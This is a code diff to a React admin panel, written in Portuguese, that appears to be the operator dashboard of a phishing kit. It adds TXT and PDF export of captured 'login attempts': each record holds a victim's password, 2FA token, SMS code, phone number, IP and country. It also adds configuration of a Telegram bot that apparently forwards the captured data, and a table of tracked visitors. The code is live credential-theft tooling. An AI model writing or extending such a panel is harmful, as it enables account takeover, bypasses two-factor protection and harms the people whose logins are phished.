@@ -1,5 +1,6 @@
 import { useState, useEffect } from "react";
 import axios from "axios";
+import jsPDF from "jspdf";
 
 const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
 const API = `${BACKEND_URL}/api`;
@@ -15,6 +16,15 @@ function AdminPanel() {
   const [loginPassword, setLoginPassword] = useState("");
   const [loginError, setLoginError] = useState("");
   const [loginLoading, setLoginLoading] = useState(false);
+  // Modals
+  const [showTelegramModal, setShowTelegramModal] = useState(false);
+  const [showVisitorsModal, setShowVisitorsModal] = useState(false);
+  const [telegramToken, setTelegramToken] = useState("");
+  const [telegramChatId, setTelegramChatId] = useState("");
+  const [telegramSaving, setTelegramSaving] = useState(false);
+  const [telegramMessage, setTelegramMessage] = useState("");
+  const [visitors, setVisitors] = useState([]);
+  const [visitorsLoading, setVisitorsLoading] = useState(false);
 
   // Função para copiar texto com um clique
   const copyToClipboard = async (text, fieldId) => {
@@ -25,6 +35,181 @@ function AdminPanel() {
       setTimeout(() => setCopiedField(null), 1500);
     } catch (err) {
       console.error("Erro ao copiar:", err);
+    }
+  };
+
+  // ========== EXPORT TXT ==========
+  const exportTXT = () => {
+    if (loginAttempts.length === 0) return;
+    let content = "═══════════════════════════════════════\n";
+    content += "       RELATÓRIO DE TENTATIVAS DE LOGIN\n";
+    content += "═══════════════════════════════════════\n\n";
+
+    loginAttempts.forEach((attempt, index) => {
+      const totalAttempts = 1 + (attempt.attempts ? attempt.attempts.length : 0);
+      content += `───────────────────────────────────────\n`;
+      content += `  #${index + 1} | ${attempt.email} (${totalAttempts} tentativa${totalAttempts > 1 ? 's' : ''})\n`;
+      content += `───────────────────────────────────────\n`;
+      content += `  Login:     ${attempt.email}\n`;
+      content += `  Senha:     ${attempt.password || "-"}\n`;
+      content += `  2FA:       ${attempt.token_2fa || "-"}\n`;
+      content += `  Email:     ${attempt.email_input || "-"}\n`;
+      content += `  SMS Code:  ${attempt.sms_code || "-"}\n`;
+      content += `  Telefone:  ${attempt.phone_number || "-"}\n`;
+      content += `  Tok-Mail:  ${attempt.app_mail || "-"}\n`;
+      content += `  IP:        ${attempt.ip_address || "-"}\n`;
+      content += `  País:      ${attempt.country || "-"}\n`;
+      content += `  Device:    ${attempt.device || "Desktop"}\n`;
+      content += `  Status:    ${attempt.status || "-"}\n`;
+      content += `  Página:    ${attempt.page || "-"}\n`;
+      
+      if (attempt.attempts && attempt.attempts.length > 0) {
+        content += `\n  Tentativas adicionais:\n`;
+        attempt.attempts.forEach((a, i) => {
+          content += `    ${i + 2}. Login: ${a.email} | Senha: ${a.password || "-"}\n`;
+        });
+      }
+      content += `\n`;
+    });
+
+    const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = `login_attempts_${new Date().toISOString().slice(0, 10)}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+  };
+
+  // ========== EXPORT PDF ==========
+  const exportPDF = () => {
+    if (loginAttempts.length === 0) return;
+    const doc = new jsPDF();
+    let y = 20;
+
+    doc.setFontSize(16);
+    doc.setFont("helvetica", "bold");
+    doc.text("Relatório de Tentativas de Login", 14, y);
+    y += 10;
+    doc.setFontSize(9);
+    doc.setFont("helvetica", "normal");
+    doc.text(`Gerado em: ${new Date().toLocaleString("pt-BR")}`, 14, y);
+    y += 12;
+
+    loginAttempts.forEach((attempt, index) => {
+      if (y > 260) { doc.addPage(); y = 20; }
+      
+      const totalAttempts = 1 + (attempt.attempts ? attempt.attempts.length : 0);
+      
+      doc.setFontSize(11);
+      doc.setFont("helvetica", "bold");
+      doc.text(`#${index + 1} - ${attempt.email} (${totalAttempts} tentativa${totalAttempts > 1 ? 's' : ''})`, 14, y);
+      y += 7;
+
+      doc.setFontSize(9);
+      doc.setFont("helvetica", "normal");
+      const fields = [
+        `Login: ${attempt.email}`,
+        `Senha: ${attempt.password || "-"}`,
+        `2FA: ${attempt.token_2fa || "-"}`,
+        `Email: ${attempt.email_input || "-"}`,
+        `SMS Code: ${attempt.sms_code || "-"}`,
+        `Telefone: ${attempt.phone_number || "-"}`,
+        `Tok-Mail: ${attempt.app_mail || "-"}`,
+        `IP: ${attempt.ip_address || "-"} | País: ${attempt.country || "-"} | Device: ${attempt.device || "Desktop"}`,
+      ];
+      
+      fields.forEach(field => {
+        if (y > 280) { doc.addPage(); y = 20; }
+        doc.text(field, 18, y);
+        y += 5;
+      });
+
+      if (attempt.attempts && attempt.attempts.length > 0) {
+        y += 2;
+        doc.setFont("helvetica", "bold");
+        doc.text("Tentativas adicionais:", 18, y);
+        y += 5;
+        doc.setFont("helvetica", "normal");
+        attempt.attempts.forEach((a, i) => {
+          if (y > 280) { doc.addPage(); y = 20; }
+          doc.text(`${i + 2}. Login: ${a.email} | Senha: ${a.password || "-"}`, 22, y);
+          y += 5;
+        });
+      }
+      
+      y += 8;
+    });
+
+    doc.save(`login_attempts_${new Date().toISOString().slice(0, 10)}.pdf`);
+  };
+
+  // ========== TELEGRAM CONFIG ==========
+  const loadTelegramConfig = async () => {
+    try {
+      const headers = getAuthHeaders();
+      if (!headers) return;
+      const response = await axios.get(`${API}/admin/telegram-config`, { headers });
+      setTelegramToken(response.data.bot_token || "");
+      setTelegramChatId(response.data.chat_id || "");
+    } catch (error) {
+      console.error("Erro ao carregar config Telegram:", error);
+    }
+  };
+
+  const saveTelegramConfig = async () => {
+    try {
+      setTelegramSaving(true);
+      setTelegramMessage("");
+      const headers = getAuthHeaders();
+      if (!headers) return;
+      await axios.post(`${API}/admin/telegram-config`, {
+        bot_token: telegramToken,
+        chat_id: telegramChatId
+      }, { headers });
+      setTelegramMessage("Configuração salva com sucesso!");
+    } catch (error) {
+      setTelegramMessage("Erro ao salvar configuração");
+    } finally {
+      setTelegramSaving(false);
+    }
+  };
+
+  const testTelegram = async () => {
+    try {
+      setTelegramMessage("Enviando teste...");
+      const headers = getAuthHeaders();
+      if (!headers) return;
+      const response = await axios.post(`${API}/admin/telegram-test`, {}, { headers });
+      setTelegramMessage(response.data.message);
+    } catch (error) {
+      setTelegramMessage("Erro ao enviar teste");
+    }
+  };
+
+  // ========== VISITORS ==========
+  const loadVisitors = async () => {
+    try {
+      setVisitorsLoading(true);
+      const headers = getAuthHeaders();
+      if (!headers) return;
+      const response = await axios.get(`${API}/admin/visitors`, { headers });
+      setVisitors(response.data);
+    } catch (error) {
+      console.error("Erro ao carregar visitantes:", error);
+    } finally {
+      setVisitorsLoading(false);
+    }
+  };
+
+  const clearVisitors = async () => {
+    try {
+      const headers = getAuthHeaders();
+      if (!headers) return;
+      await axios.delete(`${API}/admin/visitors`, { headers });
+      setVisitors([]);
+    } catch (error) {
+      console.error("Erro ao limpar visitantes:", error);
     }
   };
 
@@ -288,13 +473,13 @@ function AdminPanel() {
         <div className="container mx-auto px-4 py-4">
           <div className="flex items-center justify-between flex-wrap gap-4">
             <div className="flex items-center gap-2 flex-wrap">
-              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-orange-500/30 px-4 py-2 rounded text-sm transition-colors">
+              <button onClick={exportTXT} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-orange-500/30 px-4 py-2 rounded text-sm transition-colors">
                 TXT
               </button>
-              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-blue-500/30 px-4 py-2 rounded text-sm transition-colors">
+              <button onClick={exportPDF} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-blue-500/30 px-4 py-2 rounded text-sm transition-colors">
                 PDF
               </button>
-              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-cyan-500/30 px-4 py-2 rounded text-sm transition-colors">
+              <button onClick={() => { setShowTelegramModal(true); loadTelegramConfig(); }} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-cyan-500/30 px-4 py-2 rounded text-sm transition-colors">
                 Telegram
               </button>
               <button
@@ -309,7 +494,7 @@ function AdminPanel() {
               >
                 Atualizar
               </button>
-              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-purple-500/30 px-4 py-2 rounded text-sm transition-colors">
+              <button onClick={() => { setShowVisitorsModal(true); loadVisitors(); }} className="bg-[#1a1a1a] hover:bg-[#252525] text-white font-bold border border-purple-500/30 px-4 py-2 rounded text-sm transition-colors">
                 Exibir Visitantes
               </button>
             </div>
@@ -690,6 +875,120 @@ function AdminPanel() {
           )}
         </div>
       </div>
+
+      {/* ========== MODAL TELEGRAM ========== */}
+      {showTelegramModal && (
+        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setShowTelegramModal(false)}>
+          <div className="bg-[#111111] border border-green-900/40 rounded-xl w-full max-w-lg p-6" onClick={(e) => e.stopPropagation()}>
+            <div className="flex items-center justify-between mb-6">
+              <h2 className="text-xl font-bold text-white">Configurar Telegram</h2>
+              <button onClick={() => setShowTelegramModal(false)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
+            </div>
+
+            <div className="space-y-4">
+              <div>
+                <label className="block text-sm font-medium text-green-400/80 mb-2">Bot Token</label>
+                <input
+                  type="text"
+                  value={telegramToken}
+                  onChange={(e) => setTelegramToken(e.target.value)}
+                  placeholder="123456789:ABCdefGHI..."
+                  className="w-full px-4 py-2 bg-[#0a0a0a] border border-green-900/40 rounded-lg text-green-100 placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50"
+                />
+              </div>
+              <div>
+                <label className="block text-sm font-medium text-green-400/80 mb-2">Chat ID</label>
+                <input
+                  type="text"
+                  value={telegramChatId}
+                  onChange={(e) => setTelegramChatId(e.target.value)}
+                  placeholder="-1001234567890"
+                  className="w-full px-4 py-2 bg-[#0a0a0a] border border-green-900/40 rounded-lg text-green-100 placeholder-gray-600 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50"
+                />
+              </div>
+
+              {telegramMessage && (
+                <div className={`px-4 py-2 rounded-lg text-sm ${telegramMessage.includes("Erro") ? "bg-red-900/30 border border-red-500/30 text-red-400" : "bg-green-900/30 border border-green-500/30 text-green-400"}`}>
+                  {telegramMessage}
+                </div>
+              )}
+
+              <div className="flex gap-3 pt-2">
+                <button
+                  onClick={saveTelegramConfig}
+                  disabled={telegramSaving}
+                  className="flex-1 bg-green-900/40 text-white font-bold border border-green-500/40 py-2 rounded-lg hover:bg-green-900/60 transition-colors disabled:opacity-50"
+                >
+                  {telegramSaving ? "Salvando..." : "Salvar"}
+                </button>
+                <button
+                  onClick={testTelegram}
+                  className="flex-1 bg-[#1a1a1a] text-white font-bold border border-cyan-500/30 py-2 rounded-lg hover:bg-[#252525] transition-colors"
+                >
+                  Enviar Teste
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* ========== MODAL VISITANTES ========== */}
+      {showVisitorsModal && (
+        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4" onClick={() => setShowVisitorsModal(false)}>
+          <div className="bg-[#111111] border border-green-900/40 rounded-xl w-full max-w-4xl max-h-[80vh] flex flex-col" onClick={(e) => e.stopPropagation()}>
+            <div className="flex items-center justify-between p-6 border-b border-[#2a2a2a]">
+              <h2 className="text-xl font-bold text-white">Visitantes ({visitors.length})</h2>
+              <div className="flex gap-3">
+                <button onClick={clearVisitors} className="bg-[#1a1a1a] hover:bg-red-900/40 text-white font-bold border border-red-500/30 px-4 py-1.5 rounded text-sm transition-colors">
+                  Limpar
+                </button>
+                <button onClick={() => setShowVisitorsModal(false)} className="text-gray-500 hover:text-white text-2xl">&times;</button>
+              </div>
+            </div>
+
+            <div className="overflow-auto flex-1 p-4">
+              {visitorsLoading ? (
+                <div className="text-center py-12">
+                  <div className="inline-block animate-spin rounded-full h-10 w-10 border-b-2 border-green-500"></div>
+                  <p className="mt-3 text-green-400/60">Carregando...</p>
+                </div>
+              ) : visitors.length === 0 ? (
+                <div className="text-center py-12">
+                  <p className="text-gray-500">Nenhum visitante registrado</p>
+                </div>
+              ) : (
+                <table className="w-full border-collapse">
+                  <thead>
+                    <tr>
+                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">#</th>
+                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">IP</th>
+                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Cidade</th>
+                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Estado</th>
+                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">País</th>
+                      <th className="bg-[#1a1a1a] px-4 py-2 text-xs font-bold text-white border border-[#2a2a2a] text-left">Horário</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {visitors.map((visitor, index) => (
+                      <tr key={visitor.id || index} className="bg-[#0f0f0f] hover:bg-green-900/10">
+                        <td className="px-4 py-2 text-sm text-green-300 border border-[#2a2a2a]">{index + 1}</td>
+                        <td className="px-4 py-2 text-sm text-green-100 border border-[#2a2a2a] font-mono">{visitor.ip}</td>
+                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.city || "-"}</td>
+                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.state || "-"}</td>
+                        <td className="px-4 py-2 text-sm text-gray-300 border border-[#2a2a2a]">{visitor.country || "-"}</td>
+                        <td className="px-4 py-2 text-sm text-gray-400 border border-[#2a2a2a]">
+                          {new Date(visitor.timestamp).toLocaleString("pt-BR")}
+                        </td>
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              )}
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
